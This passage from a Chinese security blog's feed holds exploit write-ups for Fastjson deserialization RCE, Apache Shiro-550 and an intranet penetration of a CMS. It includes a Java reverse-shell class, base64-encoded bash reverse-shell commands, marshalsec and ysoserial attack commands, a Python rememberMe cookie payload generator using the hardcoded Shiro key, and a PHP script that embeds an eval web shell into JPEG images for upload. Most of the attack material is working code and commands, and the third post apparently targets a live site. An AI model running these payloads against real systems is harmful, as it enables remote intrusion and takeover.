class="line"></span><br><span class="line">1.2.67版本前</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;zeo&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet4Address&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;fatu5k.dnslog.cn&quot;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">1.2.67版本后payload</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet4Address&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet6Address&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png"></p><p>成功</p><p><img src="/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png"></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>将exp.java进行编译</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javac TouchFile.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TouchFile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;‐c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.213.129/7777 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac exp.java</span><br></pre></td></tr></table></figure><p>会在当前目录生成exp.class</p><p>在exp目录中执行启动web服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>进入target目录开启RMI服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot; http://192.168.213.129/#exp&quot; 9999</span><br></pre></td></tr></table></figure><p>VPS监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure><p>MMP，一直都不成功，搞心态，说是啥拒绝连接</p><p><img src="/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png"></p><p>不知道为啥，500错误，有知道的师傅欢迎留言~~~</p><p><img src="/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png"></p><hr><p>工具下载地址，每天做好工具人~~~</p><p><a href="https://github.com/zhzyker/exphub/tree/master/fastjson">https://github.com/zhzyker/exphub/tree/master/fastjson</a></p><p>kali监听8888端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888</span><br></pre></td></tr></table></figure><p><img src="/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/16.png"></p><p>开启RMI服务，加载远程恶意java类</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.213.133/8881 0&gt;&amp;1 //转成bash能执行的格式如下，</span><br><span class="line">java -cp fastjson_tool.jar fastjson.HRMIServer 192.168.1.19 9999 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIxMy4xMzUvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/14.png"></p><p>发送利用fastjson反序列化漏洞使靶机执行RMI服务的恶意java类执行远程命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 fastjson-1.2.47_rce.py http://192.168.213.141:8090 rmi://192.168.1.19:9999/Object</span><br></pre></td></tr></table></figure><p><img src="/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/15.png"></p><p>终于反弹shell成功了</p><p><img src="/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/13.png"></p><h1 id="批量检查工具"><a href="#批量检查工具" class="headerlink" title="批量检查工具"></a>批量检查工具</h1><p><a href="https://github.com/mrknow001/fastjson_rec_exploit">https://github.com/mrknow001/fastjson_rec_exploit</a></p><p>将URL放入target.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 fastjson_check.py</span><br></pre></td></tr></table></figure><p>这里的一键利用工具，我的外带不了数据，不知道为啥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 fastjson_rce_exploit.py -u &quot;http:&#x2F;&#x2F;192.168.213.141:8090&quot; -s 192.168.1.19 -c &quot;curl la0chf.dnslog.cn&quot;</span><br></pre></td></tr></table></figure><p><img src="/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12.png"></p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>搭环境+复现等七七八八的弄了差不多一天，搞心态，有空再尝试吧~~~</p><hr><p>最终换了另外一个工具反弹成功，菜是原罪~~~</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiro 550复现</title>
      <link href="2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。</p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p><strong>Apache Shiro &lt;= 1.2.4</strong></p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>Apache Shiro 1.2.4及以前版本中，Apache Shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值 &gt; Base64解码–&gt;AES解密–&gt;反序列化。然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞</p><h1 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h1><p>shiro反序列化的特征：在返回包的 Set-Cookie 中存在rememberMe=deleteMe 字段</p><p><img src="/2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/1.png"></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">获取docker镜像</span><br><span class="line">docker pull medicean/vulapps:s_shiro_1</span><br><span class="line">启动docker镜像：</span><br><span class="line">docker run -d -p 8080:8080 medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p><strong>存在</strong> <strong>Set-Cookie</strong> <strong>利用</strong> <strong>Shiro_exploit</strong> <strong>脚本检测一下是否存在默认key</strong></p><p><strong>python2 shiro.py -u <a href="http://xxx.xxx.xxx.xxx/login.jsp">http://xxx.xxx.xxx.xxx/login.jsp</a></strong></p><p><img src="/2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/2.png"></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>VPS监听:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure><p><strong>随后在vps，执行如下命令：（注意这里监听的端口为1099）</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 <span class="string">&#x27;命令&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>这里的命令需要使用Java Runtime配置bash编码</strong></p><p><strong>在线编码转换地址：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></strong></p><p><strong>转换命令如下：（这里是反弹shell的端口为1234）</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/VPS公网ip/1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="/2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/4.png"></p><p><strong>最终在VPS上执行的命令如下</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections4 <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8zOS45Ny4xMDAuMjcvMTIzNCAwPiYxCgo=&#125; | &#123;base64 -d&#125; | &#123;bash,-i&#125;</span></span><br></pre></td></tr></table></figure><p>使用exp.py 生成Payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span>(<span class="params">command</span>):</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial-0.0.5-SNAPSHOT-all.jar&#x27;</span>, <span class="string">&#x27;CommonsCollections2&#x27;</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS   = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key  =  <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode =  AES.MODE_CBC</span><br><span class="line">    iv   =  uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/tmp/payload.cookie&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> fpw:</span><br><span class="line">        print(<span class="string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()), file=fpw)</span><br></pre></td></tr></table></figure><p>把生成的payload复制下来，粘贴到cookie后面</p><p><img src="/2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/6.png"></p><p>发包即可，查看VPS上的结果</p><p><img src="/2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/7.png"></p><p><img src="/2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/8.png"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次内网渗透</title>
      <link href="2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
      <url>2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首先，这个站点有一个前台getshell的漏洞</p><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/1.png"></p><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/2.png"></p><p>根据里面漏洞代码直接取post数据后缀作为后缀这一特性，且CMS支持FTP。</p><p>利用FTP上传图片，通过下载上传的正常图片（已被PHP的GD库渲染）之后，</p><p>利用脚本在图片中插入payload，</p><p>再次利用FTP上传达到GET Shell的目的</p><p>payload如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?<span class="keyword">case</span>=tool&amp;act=cut_image </span><br><span class="line">pic=1ftp://*.*.*.*/shell.php&amp;w=228&amp;h=146&amp;x1=0&amp;x2=228&amp;y1=0&amp;y2=146</span><br></pre></td></tr></table></figure><h1 id="搭建FTP服务器"><a href="#搭建FTP服务器" class="headerlink" title="搭建FTP服务器"></a>搭建FTP服务器</h1><p>我这里使用ubantu进行搭建</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">安装VSFTPD</span><br><span class="line">sudo apt-get install vsftpd</span><br><span class="line">安装完成后启动VSFTPD服务</span><br><span class="line">service vsftpd start</span><br><span class="line">新建目录/home/uftp作为用户主目录</span><br><span class="line">sudo mkdir /home/uftp，最后我搭建完，主目录不是这里，/srv/ftp，这个才是 新建用户uftp，制定用户主目录和所用shell，并设置密码</span><br><span class="line">sudo useradd -d /home/uftp -s /bin/bash uftp</span><br><span class="line">sudo passwd uftp</span><br><span class="line">然后将目录/home/uftp的所属者和所属组都改为uftp</span><br><span class="line">sudo chown uftp:uftp /home/uftp</span><br><span class="line">新建文件/etc/vsftpd.user_list，用于存放允许访问ftp的用户</span><br><span class="line">sudo vim /etc/vsftpd.user_list，添加用户uftp</span><br><span class="line">最后设置匿名访问</span><br><span class="line">vim /etc/vsftpd.conf</span><br><span class="line">write_enable=YES</span><br><span class="line">anonymous_enable=YES</span><br><span class="line">anon_upload_enable=YES</span><br><span class="line">anon_other_write_enable=YES</span><br><span class="line">anon_world_readable_only=NO</span><br><span class="line">重启vsftpd服务，假如不行则设置相应的权限</span><br></pre></td></tr></table></figure><h1 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h1><p>步骤：</p><ol><li><p>将一张比较大的图片上传到ftp</p></li><li><p>利用上述POC，将图片上传到目标服务器，上传成功之后再将图片保存下来</p></li><li><pre><code class="bash">/index.php?case=tool&amp;act=cut_image pic=1ftp://*.*.*.*/*.jpg&amp;w=228&amp;h=146&amp;x1=0&amp;x2=228&amp;y1=0&amp;y2=146<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   4.保存图片之后，利用脚本在里面进行加shell</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">&lt;?php</span><br><span class="line">    &#x2F;*</span><br><span class="line"></span><br><span class="line">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span><br><span class="line">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class="line"></span><br><span class="line">    1) Upload an arbitrary image via secured files upload script</span><br><span class="line">    2) Save the processed image and launch:</span><br><span class="line">    jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class="line"></span><br><span class="line">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class="line"></span><br><span class="line">    Since the most straightforward injection method is used, the following problems can occur:</span><br><span class="line">    1) After the second processing the injected data may become partially corrupted.</span><br><span class="line">    2) The jpg_payload.php script outputs &quot;Something&#39;s wrong&quot;.</span><br><span class="line">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class="line"></span><br><span class="line">    Sergey Bobrov @Black2Fan.</span><br><span class="line"></span><br><span class="line">    See also:</span><br><span class="line">    https:&#x2F;&#x2F;www.idontplaydarts.com&#x2F;2012&#x2F;06&#x2F;encoding-web-shells-in-png-idat-chunks&#x2F;</span><br><span class="line"></span><br><span class="line">    *&#x2F;</span><br><span class="line">    &#x2F;&#x2F; $miniPayload &#x3D; $argv[2];</span><br><span class="line">    $miniPayload &#x3D; &#39;&lt;?php eval($_POST[1]);?&gt;&#39;; &#x2F;&#x2F;在这里进行加木马</span><br><span class="line"></span><br><span class="line">    if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) &#123;</span><br><span class="line">        die(&#39;php-gd is not installed&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!isset($argv[1])) &#123;</span><br><span class="line">        die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(&quot;custom_error_handler&quot;);</span><br><span class="line"></span><br><span class="line">    for($pad &#x3D; 0; $pad &lt; 1024; $pad++) &#123;</span><br><span class="line">        $nullbytePayloadSize &#x3D; $pad;</span><br><span class="line">        $dis &#x3D; new DataInputStream($argv[1]);</span><br><span class="line">        $outStream &#x3D; file_get_contents($argv[1]);</span><br><span class="line">        $extraBytes &#x3D; 0;</span><br><span class="line">        $correctImage &#x3D; TRUE;</span><br><span class="line"></span><br><span class="line">        if($dis-&gt;readShort() !&#x3D; 0xFFD8) &#123;</span><br><span class="line">            die(&#39;Incorrect SOI marker&#39;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() &#x3D;&#x3D; 0xFF)) &#123;</span><br><span class="line">            $marker &#x3D; $dis-&gt;readByte();</span><br><span class="line">            $size &#x3D; $dis-&gt;readShort() - 2;</span><br><span class="line">            $dis-&gt;skip($size);</span><br><span class="line">            if($marker &#x3D;&#x3D;&#x3D; 0xDA) &#123;</span><br><span class="line">                $startPos &#x3D; $dis-&gt;seek();</span><br><span class="line">                $outStreamTmp &#x3D; </span><br><span class="line">                    substr($outStream, 0, $startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . </span><br><span class="line">                    substr($outStream, $startPos);</span><br><span class="line">                checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE);</span><br><span class="line">                if($extraBytes !&#x3D;&#x3D; 0) &#123;</span><br><span class="line">                    while((!$dis-&gt;eof())) &#123;</span><br><span class="line">                        if($dis-&gt;readByte() &#x3D;&#x3D;&#x3D; 0xFF) &#123;</span><br><span class="line">                            if($dis-&gt;readByte !&#x3D;&#x3D; 0x00) &#123;</span><br><span class="line">                                break;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $stopPos &#x3D; $dis-&gt;seek() - 2;</span><br><span class="line">                    $imageStreamSize &#x3D; $stopPos - $startPos;</span><br><span class="line">                    $outStream &#x3D; </span><br><span class="line">                        substr($outStream, 0, $startPos) . </span><br><span class="line">                        $miniPayload . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).</span><br><span class="line">                                substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                            0,</span><br><span class="line">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                                substr($outStream, $stopPos);</span><br><span class="line">                &#125; elseif($correctImage) &#123;</span><br><span class="line">                    $outStream &#x3D; $outStreamTmp;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) &#123;</span><br><span class="line">                    die(&#39;Success!&#39;);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(&#39;payload_&#39;.$argv[1]);</span><br><span class="line">    die(&#39;Something\&#39;s wrong&#39;);</span><br><span class="line"></span><br><span class="line">    function checkImage($filename, $data, $unlink &#x3D; FALSE) &#123;</span><br><span class="line">        global $correctImage;</span><br><span class="line">        file_put_contents($filename, $data);</span><br><span class="line">        $correctImage &#x3D; TRUE;</span><br><span class="line">        imagecreatefromjpeg($filename);</span><br><span class="line">        if($unlink)</span><br><span class="line">            unlink($filename);</span><br><span class="line">        return $correctImage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;</span><br><span class="line">        global $extraBytes, $correctImage;</span><br><span class="line">        $correctImage &#x3D; FALSE;</span><br><span class="line">        if(preg_match(&#39;&#x2F;(\d+) extraneous bytes before marker&#x2F;&#39;, $errstr, $m)) &#123;</span><br><span class="line">            if(isset($m[1])) &#123;</span><br><span class="line">                $extraBytes &#x3D; (int)$m[1];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class DataInputStream &#123;</span><br><span class="line">        private $binData;</span><br><span class="line">        private $order;</span><br><span class="line">        private $size;</span><br><span class="line"></span><br><span class="line">        public function __construct($filename, $order &#x3D; false, $fromString &#x3D; false) &#123;</span><br><span class="line">            $this-&gt;binData &#x3D; &#39;&#39;;</span><br><span class="line">            $this-&gt;order &#x3D; $order;</span><br><span class="line">            if(!$fromString) &#123;</span><br><span class="line">                if(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                    die(&#39;File not exists [&#39;.$filename.&#39;]&#39;);</span><br><span class="line">                $this-&gt;binData &#x3D; file_get_contents($filename);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $this-&gt;binData &#x3D; $filename;</span><br><span class="line">            &#125;</span><br><span class="line">            $this-&gt;size &#x3D; strlen($this-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function seek() &#123;</span><br><span class="line">            return ($this-&gt;size - strlen($this-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function skip($skip) &#123;</span><br><span class="line">            